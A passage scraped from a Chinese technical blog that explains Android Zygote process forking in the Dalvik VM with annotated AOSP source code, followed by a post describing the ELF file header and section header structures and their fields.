created&quot;</span>, pid);</span><br><span class="line">        <span class="comment">// 保存system_server的进程id</span></span><br><span class="line">        gDvm.systemServerPid = pid;</span><br><span class="line">        <span class="comment">/* There is a slight window that the system server process has crashed</span></span><br><span class="line"><span class="comment">         * but it went unnoticed because we haven&#x27;t published its pid yet. So</span></span><br><span class="line"><span class="comment">         * we recheck here just to make sure that all is well.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (waitpid(pid, &amp;status, WNOHANG) == pid) &#123;</span><br><span class="line">            <span class="comment">// 如果system_server退出了，Zygote直接kill自己</span></span><br><span class="line">            ALOGE(<span class="string">&quot;System server process %d has died. Restarting Zygote!&quot;</span>, pid);</span><br><span class="line">            kill(getpid(), SIGKILL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RETURN_INT(pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>system_server子进程一直驻留在系统中，一旦此进程退出，父进程Zygote也会被终止。系统init进程通过重启Zygote进程，使得Zygote进程重新启动system_server进程。<br>(3) forkAndSpecialize()<br><strong>代码清单</strong> dalvik/vm/native/dalvik_system_Zygote.cpp: Dalvik_dalvik_system_Zygote_forkAndSpecialize()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * native public static int nativeForkAndSpecialize(int uid, int gid,</span></span><br><span class="line"><span class="comment"> *     int[] gids, int debugFlags, int[][] rlimits, int mountExternal,</span></span><br><span class="line"><span class="comment"> *     String seInfo, String niceName);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dalvik_dalvik_system_Zygote_forkAndSpecialize</span><span class="params">(<span class="keyword">const</span> u4 *args, JValue *pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = forkAndSpecializeCommon(args, <span class="literal">false</span>);</span><br><span class="line">    RETURN_INT(pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>forkAndSpecializeCommon()</code>函数的第二个参数标识创建的子进程是否为system_server子进程。forkSystemServer()调用时第二个参数为true，而forkAndSpecialize()调用时为false。<br><strong>代码清单</strong> dalvik/vm/native/dalvik_system_Zygote.cpp: forkAndSpecializeCommon()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Utility routine to fork zygote and specialize the child process.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">pid_t</span> <span class="title">forkAndSpecializeCommon</span><span class="params">(<span class="keyword">const</span> u4* args, <span class="keyword">bool</span> isSystemServer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uid_t</span> uid = (<span class="keyword">uid_t</span>) args[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">gid_t</span> gid = (<span class="keyword">gid_t</span>) args[<span class="number">1</span>];</span><br><span class="line">    ArrayObject* gids = (ArrayObject *)args[<span class="number">2</span>];</span><br><span class="line">    u4 debugFlags = args[<span class="number">3</span>];</span><br><span class="line">    ArrayObject *rlimits = (ArrayObject *)args[<span class="number">4</span>];</span><br><span class="line">    u4 mountMode = MOUNT_EXTERNAL_NONE;</span><br><span class="line">    <span class="keyword">int64_t</span> permittedCapabilities, effectiveCapabilities;</span><br><span class="line">    <span class="keyword">char</span> *seInfo = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *niceName = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 判断是否为system_server进程</span></span><br><span class="line">    <span class="keyword">if</span> (isSystemServer) &#123;</span><br><span class="line">        permittedCapabilities = args[<span class="number">5</span>] | (<span class="keyword">int64_t</span>) args[<span class="number">6</span>] &lt;&lt; <span class="number">32</span>;</span><br><span class="line">        effectiveCapabilities = args[<span class="number">7</span>] | (<span class="keyword">int64_t</span>) args[<span class="number">8</span>] &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mountMode = args[<span class="number">5</span>];</span><br><span class="line">        permittedCapabilities = effectiveCapabilities = <span class="number">0</span>;</span><br><span class="line">        StringObject* seInfoObj = (StringObject*)args[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">if</span> (seInfoObj) &#123;</span><br><span class="line">            seInfo = dvmCreateCstrFromString(seInfoObj);</span><br><span class="line">            <span class="keyword">if</span> (!seInfo) &#123;</span><br><span class="line">                ALOGE(<span class="string">&quot;seInfo dvmCreateCstrFromString failed&quot;</span>);</span><br><span class="line">                dvmAbort();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        StringObject* niceNameObj = (StringObject*)args[<span class="number">7</span>];</span><br><span class="line">        <span class="keyword">if</span> (niceNameObj) &#123;</span><br><span class="line">            niceName = dvmCreateCstrFromString(niceNameObj);</span><br><span class="line">            <span class="keyword">if</span> (!niceName) &#123;</span><br><span class="line">                ALOGE(<span class="string">&quot;niceName dvmCreateCstrFromString failed&quot;</span>);</span><br><span class="line">                dvmAbort();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断当前虚拟机是否支持Zygote</span></span><br><span class="line">    <span class="keyword">if</span> (!gDvm.zygote) &#123;</span><br><span class="line">        dvmThrowIllegalStateException(</span><br><span class="line">            <span class="string">&quot;VM instance not started with -Xzygote&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断堆创建是否成功，不成功则停止虚拟机</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmGcPreZygoteFork()) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;pre-fork heap failed&quot;</span>);</span><br><span class="line">        dvmAbort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置信号处理</span></span><br><span class="line">    setSignalHandler();</span><br><span class="line">    dvmDumpLoaderStats(<span class="string">&quot;zygote&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> err;</span><br><span class="line">        <span class="comment">/* The child process */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_ANDROID_OS</span></span><br><span class="line">        <span class="keyword">extern</span> <span class="keyword">int</span> gMallocLeakZygoteChild;</span><br><span class="line">        gMallocLeakZygoteChild = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* keep caps across UID change, unless we&#x27;re staying root */</span></span><br><span class="line">        <span class="keyword">if</span> (uid != <span class="number">0</span>) &#123;</span><br><span class="line">            err = prctl(PR_SET_KEEPCAPS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">&quot;cannot PR_SET_KEEPCAPS: %s&quot;</span>, strerror(errno));</span><br><span class="line">                dvmAbort();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; prctl(PR_CAPBSET_READ, i, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span>; i++) &#123;</span><br><span class="line">            err = prctl(PR_CAPBSET_DROP, i, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINVAL) &#123;</span><br><span class="line">                    ALOGW(<span class="string">&quot;PR_CAPBSET_DROP %d failed: %s. &quot;</span></span><br><span class="line">                          <span class="string">&quot;Please make sure your kernel is compiled with &quot;</span></span><br><span class="line">                          <span class="string">&quot;file capabilities support enabled.&quot;</span>,</span><br><span class="line">                          i, strerror(errno));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ALOGE(<span class="string">&quot;PR_CAPBSET_DROP %d failed: %s.&quot;</span>, i, strerror(errno));</span><br><span class="line">                    dvmAbort();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_ANDROID_OS */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mountMode != MOUNT_EXTERNAL_NONE) &#123;</span><br><span class="line">            err = mountEmulatedStorage(uid, mountMode);</span><br><span class="line">            <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">&quot;cannot mountExternalStorage(): %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (errno == ENOTCONN || errno == EROFS) &#123;</span><br><span class="line">                    <span class="comment">// When device is actively encrypting, we get ENOTCONN here</span></span><br><span class="line">                    <span class="comment">// since FUSE was mounted before the framework restarted.</span></span><br><span class="line">                    <span class="comment">// When encrypted device is booting, we get EROFS since</span></span><br><span class="line">                    <span class="comment">// FUSE hasn&#x27;t been created yet by init.</span></span><br><span class="line">                    <span class="comment">// In either case, continue without external storage.</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dvmAbort();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将list数组中所标明的组加入到目前进程的组设置中</span></span><br><span class="line">        err = setgroupsIntarray(gids);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot setgroups(): %s&quot;</span>, strerror(errno));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置资源限制</span></span><br><span class="line">        err = setrlimitsFromArray(rlimits);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot setrlimit(): %s&quot;</span>, strerror(errno));</span><br><span class="line">            dvmAbort();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// 设置指定进程组id</span></span><br><span class="line">        err = setresgid(gid, gid, gid);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot setresgid(%d): %s&quot;</span>, gid, strerror(errno));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置用户id</span></span><br><span class="line">        err = setresuid(uid, uid, uid);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot setresuid(%d): %s&quot;</span>, uid, strerror(errno));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (needsNoRandomizeWorkaround()) &#123;</span><br><span class="line">            <span class="keyword">int</span> current = personality(<span class="number">0xffffFFFF</span>);</span><br><span class="line">            <span class="keyword">int</span> success = personality((ADDR_NO_RANDOMIZE | current));</span><br><span class="line">            <span class="keyword">if</span> (success == <span class="number">-1</span>) &#123;</span><br><span class="line">                ALOGW(<span class="string">&quot;Personality switch failed. current=%d error=%d\n&quot;</span>, current, errno);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置Linux功能标识</span></span><br><span class="line">        err = setCapabilities(permittedCapabilities, effectiveCapabilities);</span><br><span class="line">        <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot set capabilities (%llx,%llx): %s&quot;</span>,</span><br><span class="line">                permittedCapabilities, effectiveCapabilities, strerror(err));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err = set_sched_policy(<span class="number">0</span>, SP_DEFAULT);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot set_sched_policy(0, SP_DEFAULT): %s&quot;</span>, strerror(-err));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err = setSELinuxContext(uid, isSystemServer, seInfo, niceName);</span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;cannot set SELinux context: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// These free(3) calls are safe because we know we&#x27;re only ever forking</span></span><br><span class="line">        <span class="comment">// a single-threaded process, so we know no other thread held the heap</span></span><br><span class="line">        <span class="comment">// lock when we forked.</span></span><br><span class="line">        <span class="built_in">free</span>(seInfo);</span><br><span class="line">        <span class="built_in">free</span>(niceName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Our system thread ID has changed.  Get the new one.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Thread* thread = dvmThreadSelf();</span><br><span class="line">        thread-&gt;systemTid = dvmGetSysThreadId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* configure additional debug options */</span></span><br><span class="line">        enableDebugFeatures(debugFlags);</span><br><span class="line">        <span class="comment">// 将信号量机制设为默认</span></span><br><span class="line">        unsetSignalHandler();</span><br><span class="line">        <span class="comment">// 子进程不支持Zygote</span></span><br><span class="line">        gDvm.zygote = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 检查虚拟机初始化是否成功</span></span><br><span class="line">        <span class="keyword">if</span> (!dvmInitAfterZygote()) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;error in post-zygote initialization&quot;</span>);</span><br><span class="line">            dvmAbort();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* the parent process */</span></span><br><span class="line">        <span class="built_in">free</span>(seInfo);</span><br><span class="line">        <span class="built_in">free</span>(niceName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>forkAndSpcializeCommon()函数与Dalvik_dalvik_system_Zygote_fork()函数流程的不同之处：</p>
<ul>
<li>在forkAndSpecializeCommon()函数开始时，需要根据参数<code>isSystemServer</code>判断所需创建的子进程是否为system_server，并对其参数进行处理。</li>
<li>由于调用forkAndSpecializeCommon()函数产生的子进程都不是Zygote进程，因此，要调用unsetSignalHandler()函数重置信号机制。同时，子进程不能创建新进程，故设置为不支持Zygote：<code>gDvm.zygote = false</code>。</li>
<li>子进程中还要检查虚拟机是否初始化成功，因为需要执行相应任务，所以必须保证虚拟机成功初始化。</li>
</ul>
<h3 id="Dalvik虚拟机运行应用程序"><a href="#Dalvik虚拟机运行应用程序" class="headerlink" title="Dalvik虚拟机运行应用程序"></a>Dalvik虚拟机运行应用程序</h3><p>应用程序是以apk文件形式被虚拟机通过<code>类加载模块</code>引用加载并提取可执行代码的。apk文件解压后得到Dex文件，类加载模块对Dex文件进行解析，将所需的类的各个信息抓取出来，并将其封装到一个数据结构实例对象中，以供解释器直接引用这个结构体对象的相关的成员变量，实现程序的实际运行。<br>类加载模块的工作主要分为以下两个阶段：<br>(1) 取得Dex原始文件将其还原到内存中，并将Dex文件与一个<code>DexFile结构体</code>对象关联。<br>(2) 对Dex文件中的各个类依次进行加载生成类对象实例，并将对象指针交付给<code>解释器</code>引用执行。<br>在Dalvik上执行的程序由字节码组成，在字节码加载已经完毕后，Dalvik虚拟机解释器被调用开始取指解释执行。解释器有两种实现：C语言实现和汇编语言实现，分别称为<code>Portable解释器</code>和<code>Fast解释器</code>。<br>为了缓解解释器的低效，有两种解决方法：</p>
<ul>
<li>采用NDK，调用静态编译的方法提高效率。</li>
<li>使用JIT，在运行时编译字节码并优化。<br>JIT更具一般性和可移植性。JIT混合了两种技术，解释器解释时编译部分程序。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/04/ELF-Executable-and-Linking-Format-part1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/04/ELF-Executable-and-Linking-Format-part1/" class="post-title-link" itemprop="url">ELF: Executable and Linking Format part1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-04 11:00:11" itemprop="dateCreated datePublished" datetime="2016-04-04T11:00:11+08:00">2016-04-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="OBJECT-FILES"><a href="#OBJECT-FILES" class="headerlink" title="OBJECT FILES"></a>OBJECT FILES</h2><h3 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h3><p>文件格式分析可以借助具体例子学习，用010editor的ELF Template加载任意一个<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1slBqULn">ELF文件</a>：<br><img src="/images/elfpart1/010editor.png"><br>可以通过010editor分析出的文件格式找到对应的二进制数据。</p>
<h3 id="File-Format"><a href="#File-Format" class="headerlink" title="File Format"></a>File Format</h3><p><img src="/images/elfpart1/fileformat.png"><br><code>ELF header</code>描述了文件的组织结构。<br><code>Sections</code>保存了目标文件Linking View的大量信息：指令、数据、符号表和重定位信息等。<br><code>Program header table</code>告诉系统如何创建一个进程映像。<br><code>Section header table</code>包含了描述文件sections的信息。每一个section在表中都有一个条目，每一个条目包含了section name、section size等信息。</p>
<h3 id="Data-Representation"><a href="#Data-Representation" class="headerlink" title="Data Representation"></a>Data Representation</h3><p><img src="/images/elfpart1/datapre.png"></p>
<h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line">    Elf32_Half    e_type;</span><br><span class="line">    Elf32_Half    e_machine;</span><br><span class="line">    Elf32_Word    e_version;</span><br><span class="line">    Elf32_Addr    e_entry;</span><br><span class="line">    Elf32_Off     e_phoff;</span><br><span class="line">    Elf32_Off     e_shoff;</span><br><span class="line">    Elf32_Word    e_flags;</span><br><span class="line">    Elf32_Half    e_ehsize;</span><br><span class="line">    Elf32_Half    e_phentsize;</span><br><span class="line">    Elf32_Half    e_phnum;</span><br><span class="line">    Elf32_Half    e_shentsize;</span><br><span class="line">    Elf32_Half    e_shnum;</span><br><span class="line">    Elf32_Half    e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure>
<p><code>e_ident</code> ELF文件的magic<br><code>e_type</code> 标识目标文件的类型。  </p>
<blockquote>
<p>ET_REL         1  Relocatable file<br>ET_EXEC       2  Executable file<br>ET_DYN        3  Shared object file</p>
</blockquote>
<p><code>e_machine</code> 文件运行在哪种体系结构上。<br><code>e_entry</code> 程序入口点。<br><code>e_phoff</code> program header table的文件偏移。<br><code>e_shoff</code> section header table的文件偏移。<br><code>e_flags</code> 处理器相关标识。<br><code>e_ehsize</code> ELF header的大小。<br><code>e_phentsize</code> 文件的program header table一个条目的大小，所有条目一样大小。<br><code>e_phnum</code> program header table中条目的个数。<br><code>e_shentsize</code> section header table中一个section header的大小，所有section header一样大小。<br><code>e_shnum</code> section header table中条目的个数。<br><code>e_shstrndx</code> section header table中和section名字字符串表相关的条目的索引。</p>
<h3 id="Sections"><a href="#Sections" class="headerlink" title="Sections"></a>Sections</h3><p><strong>Section Header</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;</span><br><span class="line">    Elf32_Word sh_type;</span><br><span class="line">    Elf32_Word sh_flags;</span><br><span class="line">    Elf32_Addr sh_addr;</span><br><span class="line">    Elf32_Off  sh_offset;</span><br><span class="line">    Elf32_Word sh_size;</span><br><span class="line">    Elf32_Word sh_link;</span><br><span class="line">    Elf32_Word sh_info;</span><br><span class="line">    Elf32_Word sh_addralign;</span><br><span class="line">    Elf32_Word sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p><code>sh_name</code> 指向section header string table section的索引，表示section的名字。<br><code>sh_type</code> 指明了section的内容和语义。<br><code>sh_flags</code> 描述section的各项属性。<br><code>sh_addr</code> 如果section将会出现在一个进程的内存映像中，这个成员给出section的起始地址。<br><code>sh_offset</code> section在文件中的偏移地址。<br><code>sh_size</code> section的大小。类型为SHT_NOBITS的section的size不为0，但它实际不占文件空间。<br><code>sh_link</code> section header table index link。<br><code>sh_info</code> 额外的信息，含义取决于section的类型。<br><code>sh_addralign</code> 有些section有地址对齐方面的约束。比如 section 中有个 doubleword 型的数据,系统就必须保证整个 section 是 doubleword 对齐的,即 sh_addr 对 sh_addralign 取模为 0。目前,此成员的取值只允许是 0 和 2 的幂数。取值 0 和 1 代表 section 没有对齐方面的约束。<br><code>sh_entsize</code> 有些section存放的表项大小固定的表，如符号表。如表项大小不固定，此成员为0。</p>
<blockquote>
<p><strong>Section Types</strong>, sh_type<br><img src="/images/elfpart1/sh_types.png"><br><code>SHT_NULL</code> 表示此头部是不活动的，不对应一个section。<br><code>SHT_PROGBITS</code> 存放着程序定义的信息，格式和含义只由程序决定。<br><code>SHT_SYMTAB &amp; SHT_DYNSYM</code> 保存着符号表。<br><code>SHT_STRTAB</code> 保存着字符串表。<br><code>SHT_RELA</code> 通过显式加数存放重定位条目。<br><code>SHT_HASH</code> 存放一个符号哈希表。<br><code>SHT_DYNAMIC</code> 存放动态链接的相关信息。<br><code>SHT_NOTE</code> 存放文件的注释信息。<br><code>SHT_NOBITS</code> 不占用文件的空间，其他方面类似于SHT_PROGBITS。<br><code>SHT_REL</code> 存放没有显式加数的重定位条目。<br><code>SHT_SHLIB</code> 保留section。<br><code>SHT_LOPROC through SHT_HIPROC</code><br><code>SHT_LOUSER</code> 留给程序使用的保留索引值的下限。<br><code>SHT_HIUSER</code> 留给程序实用的保留索引值的上限。</p>
</blockquote>
<blockquote>
<p><strong>Section Attribute Flags</strong>, sh_flags<br><img src="/images/elfpart1/sh_flag.png"><br><code>SHF_WRITE</code> section包含在进程执行期间可写的数据。<br><code>SHF_ALLOC</code> section在进程执行期间占据内存。一些section不在目标文件的内存映像中，这个属性就是off。<br><code>SHF_EXECINSTR</code> section包含可执行的机器指令。<br><code>SHF_MASKPROC</code> 这个掩码中的所有比特位留作处理器相关的语义。</p>
</blockquote>
